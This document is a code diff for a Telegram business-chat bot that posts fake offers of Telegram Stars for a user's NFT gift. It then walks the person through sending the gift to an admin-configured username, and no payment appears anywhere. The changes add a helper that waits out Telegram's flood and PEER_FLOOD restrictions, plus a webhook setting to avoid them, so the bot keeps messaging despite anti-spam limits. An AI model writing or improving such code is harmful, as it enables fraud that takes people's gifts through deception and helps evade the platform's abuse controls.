@@ -4,7 +4,7 @@ import os
 import aiosqlite
 from aiohttp import web
 
-from aiogram import Bot, Dispatcher, F, Router, types
+from aiogram import Bot, Dispatcher, F, Router
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import StatesGroup, State
@@ -12,6 +12,7 @@ from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
     Message, CallbackQuery, LinkPreviewOptions
 )
+from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
 from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -25,8 +26,10 @@ WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
 PORT = int(os.getenv("PORT", 8080))
 DB_NAME = "bot_database.db"
 
+# Хранилище активных офферов в памяти (message_id: nft_name)
 active_offers = {}
 
+# --- ЛОКАЛИЗАЦИЯ ---
 LOCALES = {
     "ru": {
         "offer": "Пользователь <b>{giver}</b> предлагает\nВам <b>{amount}</b> {star} звёзд за подарок\n<b>{link_html}</b>.\n\nПредложение действует ещё 6ч.",
@@ -108,9 +111,6 @@ async def get_emoji_text(key: str):
         return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
     return fallback
 
-async def get_button_emoji(key: str):
-    return await get_emoji_id(key)
-
 # --- СОСТОЯНИЯ FSM ---
 class AdminStates(StatesGroup):
     waiting_for_username = State()
@@ -121,12 +121,30 @@ class AdminStates(StatesGroup):
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
-dp.include_router(router)  # <--- ОЧЕНЬ ВАЖНО! БЕЗ ЭТОЙ СТРОКИ БОТ НЕ БУДЕТ ВИДЕТЬ КОМАНДЫ
+dp.include_router(router) # ВАЖНО: подключение роутера
+
+# --- ХЕЛПЕР ДЛЯ БЕЗОПАСНОЙ ОТПРАВКИ (ЗАЩИТА ОТ PEER_FLOOD) ---
+async def safe_send(func, *args, **kwargs):
+    try:
+        return await func(*args, **kwargs)
+    except TelegramRetryAfter as e:
+        logging.warning(f"Flood control: waiting {e.retry_after} seconds")
+        await asyncio.sleep(e.retry_after)
+        return await func(*args, **kwargs)
+    except TelegramBadRequest as e:
+        if "PEER_FLOOD" in e.message:
+            logging.error("PEER_FLOOD: Bot is temporarily restricted. Sleeping for 1 hour.")
+            await asyncio.sleep(3600)
+            return await func(*args, **kwargs)
+        else:
+            logging.error(f"Bad Request: {e.message}")
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
 
 # --- ГЕНЕРАТОРЫ КЛАВИАТУР ---
 async def get_offer_keyboard(lang: str):
-    decline_id = await get_button_emoji("decline")
-    accept_id = await get_button_emoji("accept")
+    decline_id = await get_emoji_id("decline")
+    accept_id = await get_emoji_id("accept")
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text=LOCALES[lang]['decline_btn'], callback_data=f"decline:{lang}", icon_custom_emoji_id=decline_id),
@@ -135,16 +153,16 @@ async def get_offer_keyboard(lang: str):
     ])
 
 async def get_success_keyboard(lang: str, target_username: str):
-    transfer_id = await get_button_emoji("transfer")
-    how_to_id = await get_button_emoji("how_to")
+    transfer_id = await get_emoji_id("transfer")
+    how_to_id = await get_emoji_id("how_to")
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=LOCALES[lang]['transfer_btn'], url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
         [InlineKeyboardButton(text=LOCALES[lang]['how_to_btn'], callback_data=f"how_to:{lang}", icon_custom_emoji_id=how_to_id)]
     ])
 
 async def get_instruction_keyboard(lang: str, target_username: str):
-    transfer_id = await get_button_emoji("transfer")
-    confirm_id = await get_button_emoji("confirm")
+    transfer_id = await get_emoji_id("transfer")
+    confirm_id = await get_emoji_id("confirm")
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=LOCALES[lang]['transfer_btn'], url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
         [InlineKeyboardButton(text=LOCALES[lang]['confirm_btn'], callback_data=f"confirm:{lang}", icon_custom_emoji_id=confirm_id)]
@@ -159,13 +177,11 @@ def get_admin_keyboard():
 
 # --- ОБРАБОТЧИКИ КОМАНД ---
 
-# Команда /start (работает и в ЛС, и в бизнес-чатах)
 @router.message(Command("start"))
 @router.business_message(Command("start"))
 async def cmd_start(message: Message):
-    await message.answer("👋 <b>Бот запущен и готов к работе!</b>\n\nДля получения инструкции введите <code>.help</code>")
+    await safe_send(message.answer, "👋 <b>Бот запущен и готов к работе!</b>\n\nДля получения инструкции введите <code>.help</code>")
 
-# Команда .help (работает и в ЛС, и в бизнес-чатах)
 @router.message(F.text == ".help")
 @router.business_message(F.text == ".help")
 async def show_help(message: Message):
@@ -196,16 +212,16 @@ async def show_help(message: Message):
         "Или используйте шаблон:\n"
         "<code>.shab [номер]</code>"
     )
-    await message.answer(text) # answer работает и в бизнес-чатах (отправляет от вашего имени)
+    await safe_send(message.answer, text)
 
 @router.business_message(F.text.startswith(".buy"))
 async def process_buy_command(message: Message):
     args = message.text.split()
     if len(args) < 5:
-        await message.reply("❌ Неверный формат / Invalid format. Используйте <code>.buy ru/eng/cn [ссылка] [сумма] [валюта]</code>")
+        await safe_send(message.reply, "❌ Неверный формат / Invalid format. Используйте <code>.buy ru/eng/cn [ссылка] [сумма] [валюта]</code>")
         return
     
-    lang, link, amount, currency = args[1].lower(), args[2], args[3], args[4]
+    lang, link, amount = args[1].lower(), args[2], args[3]
     if lang not in LOCALES:
         lang = "ru"
 
@@ -213,7 +229,6 @@ async def process_buy_command(message: Message):
     link_html = f'<a href="{link}">{nft_name}</a>'
     
     active_offers[message.message_id] = nft_name
-    
     e_star = await get_emoji_text("star")
     giver_username = message.from_user.username or message.from_user.first_name
     
@@ -223,7 +238,12 @@ async def process_buy_command(message: Message):
     
     link_preview = LinkPreviewOptions(url=link, show_above_text=True)
     
-    await message.reply(text, reply_markup=await get_offer_keyboard(lang), link_preview_options=link_preview)
+    await safe_send(
+        message.reply, text, 
+        reply_markup=await get_offer_keyboard(lang), 
+        link_preview_options=link_preview
+    )
+    
     try:
         await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
     except Exception:
@@ -233,7 +253,7 @@ async def process_buy_command(message: Message):
 @router.callback_query(F.data.startswith("decline:"))
 async def decline_offer(callback: CallbackQuery):
     lang = callback.data.split(":")[1]
-    await callback.message.edit_text(text=LOCALES[lang]['decline_text'], reply_markup=None)
+    await safe_send(callback.message.edit_text, text=LOCALES[lang]['decline_text'], reply_markup=None)
     await callback.answer("❌")
 
 @router.callback_query(F.data.startswith("accept:"))
@@ -246,7 +266,7 @@ async def accept_offer(callback: CallbackQuery):
     e_gift = await get_emoji_text("gift")
     
     text = LOCALES[lang]['sold_text'].format(gift=e_gift, nft_name=nft_name)
-    await callback.message.edit_text(text, reply_markup=await get_success_keyboard(lang, target_username))
+    await safe_send(callback.message.edit_text, text, reply_markup=await get_success_keyboard(lang, target_username))
 
 @router.callback_query(F.data.startswith("how_to:"))
 async def how_to_transfer(callback: CallbackQuery):
@@ -255,33 +275,29 @@ async def how_to_transfer(callback: CallbackQuery):
     target_username = await get_setting("target_username")
     
     text = LOCALES[lang]['instruction_text'].format(target=target_username, nft_name=nft_name)
-    await callback.message.edit_text(text, reply_markup=await get_instruction_keyboard(lang, target_username))
+    await safe_send(callback.message.edit_text, text, reply_markup=await get_instruction_keyboard(lang, target_username))
 
 @router.callback_query(F.data.startswith("confirm:"))
 async def confirm_transfer(callback: CallbackQuery):
     lang = callback.data.split(":")[1]
     e_clock = await get_emoji_text("clock")
-    
-    await callback.answer(
-        LOCALES[lang]['confirm_alert'].format(clock=e_clock),
-        show_alert=True
-    )
+    await callback.answer(LOCALES[lang]['confirm_alert'].format(clock=e_clock), show_alert=True)
 
 # --- АДМИН ПАНЕЛЬ ---
 @router.message(Command("admin"), F.from_user.id == ADMIN_ID)
 async def admin_panel(message: Message):
-    await message.answer("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())
+    await safe_send(message.answer, "👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())
 
 @router.callback_query(F.data == "admin_set_user", F.from_user.id == ADMIN_ID)
 async def admin_set_user(callback: CallbackQuery, state: FSMContext):
-    await callback.message.answer("Введите новый юзернейм получателя (без @):")
+    await safe_send(callback.message.answer, "Введите новый юзернейм получателя (без @):")
     await state.set_state(AdminStates.waiting_for_username)
     await callback.answer()
 
 @router.message(AdminStates.waiting_for_username, F.from_user.id == ADMIN_ID)
 async def process_username(message: Message, state: FSMContext):
     await set_setting("target_username", message.text)
-    await message.answer(f"✅ Юзернейм изменен на @{message.text}")
+    await safe_send(message.answer, f"✅ Юзернейм изменен на @{message.text}")
     await state.clear()
 
 @router.callback_query(F.data == "admin_emojis", F.from_user.id == ADMIN_ID)
@@ -292,7 +308,7 @@ async def admin_emojis_menu(callback: CallbackQuery):
         status = "✅ Вкл" if e_id else "❌ Выкл"
         kb.append([InlineKeyboardButton(text=f"{fallback} {key} — {status}", callback_data=f"edit_emoji_{key}")])
     kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
-    await callback.message.edit_text("Управление премиум-эмодзи:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
+    await safe_send(callback.message.edit_text, "Управление премиум-эмодзи:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
     await callback.answer()
 
 @router.callback_query(F.data.startswith("edit_emoji_"), F.from_user.id == ADMIN_ID)
@@ -306,7 +322,7 @@ async def edit_emoji(callback: CallbackQuery, state: FSMContext):
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_emojis")]
     ])
     
-    await callback.message.edit_text(
+    await safe_send(callback.message.edit_text,
         f"Настройка эмодзи: {fallback}\n\n"
         "Отправьте ID премиум-эмодзи (только цифры), чтобы включить его.\n"
         "Или нажмите кнопку ниже, чтобы отключить и вернуть обычный эмодзи.", 
@@ -327,7 +343,7 @@ async def reset_emoji(callback: CallbackQuery, state: FSMContext):
 @router.message(AdminStates.waiting_for_emoji_id, F.from_user.id == ADMIN_ID)
 async def process_emoji_id(message: Message, state: FSMContext):
     if not message.text.isdigit():
-        await message.answer("❌ ID должен состоять только из цифр. Попробуйте еще раз.")
+        await safe_send(message.answer, "❌ ID должен состоять только из цифр. Попробуйте еще раз.")
         return
         
     data = await state.get_data()
@@ -337,16 +353,16 @@ async def process_emoji_id(message: Message, state: FSMContext):
         await db.execute("INSERT OR REPLACE INTO emojis (key, emoji_id) VALUES (?, ?)", (key, message.text))
         await db.commit()
         
-    await message.answer(f"✅ Премиум-эмодзи для '{key}' успешно обновлен!\nТеперь он включен.", reply_markup=get_admin_keyboard())
+    await safe_send(message.answer, f"✅ Премиум-эмодзи для '{key}' успешно обновлен!\nТеперь он включен.", reply_markup=get_admin_keyboard())
     await state.clear()
 
 @router.callback_query(F.data == "admin_back", F.from_user.id == ADMIN_ID)
 async def admin_back(callback: CallbackQuery):
-    await callback.message.edit_text("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())
+    await safe_send(callback.message.edit_text, "👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())
 
 @router.callback_query(F.data == "admin_create_tpl", F.from_user.id == ADMIN_ID)
 async def admin_create_tpl(callback: CallbackQuery, state: FSMContext):
-    await callback.message.answer("Введите текст шаблона (можно использовать HTML):")
+    await safe_send(callback.message.answer, "Введите текст шаблона (можно использовать HTML):")
     await state.set_state(AdminStates.waiting_for_template)
     await callback.answer()
 
@@ -356,14 +372,14 @@ async def process_template(message: Message, state: FSMContext):
         cursor = await db.execute("INSERT INTO templates (text) VALUES (?)", (message.html_text,))
         tpl_id = cursor.lastrowid
         await db.commit()
-    await message.answer(f"✅ Шаблон создан! Чтобы вызвать его, напишите в бизнес-чат:\n<code>.shab {tpl_id}</code>", reply_markup=get_admin_keyboard())
+    await safe_send(message.answer, f"✅ Шаблон создан! Чтобы вызвать его, напишите в бизнес-чат:\n<code>.shab {tpl_id}</code>", reply_markup=get_admin_keyboard())
     await state.clear()
 
 @router.business_message(F.text.startswith(".shab"))
 async def process_shab_command(message: Message):
     args = message.text.split()
     if len(args) < 2:
-        await message.reply("❌ Укажите номер шаблона: <code>.shab 1</code>")
+        await safe_send(message.reply, "❌ Укажите номер шаблона: <code>.shab 1</code>")
         return
     
     tpl_id = args[1]
@@ -372,15 +388,16 @@ async def process_shab_command(message: Message):
             row = await cursor.fetchone()
             
     if row:
-        await message.reply(row[0], parse_mode=ParseMode.HTML)
+        await safe_send(message.reply, row[0], parse_mode=ParseMode.HTML)
     else:
-        await message.reply("❌ Шаблон с таким номером не найден.")
+        await safe_send(message.reply, "❌ Шаблон с таким номером не найден.")
 
 # --- ВЕБХУК ДЛЯ RENDER ---
 async def on_startup(bot: Bot):
     await init_db()
     if WEBHOOK_HOST:
-        await bot.set_webhook(WEBHOOK_URL)
+        # drop_pending_updates=True СБРАСЫВАЕТ ВСЕ СТАРЫЕ СООБЩЕНИЯ, ЧТОБЫ ИЗБЕЖАТЬ PEER_FLOOD
+        await bot.set_webhook(WEBHOOK_URL, drop_pending_updates=True)
         logging.info(f"Webhook set to {WEBHOOK_URL}")
 
 async def on_shutdown(bot: Bot):
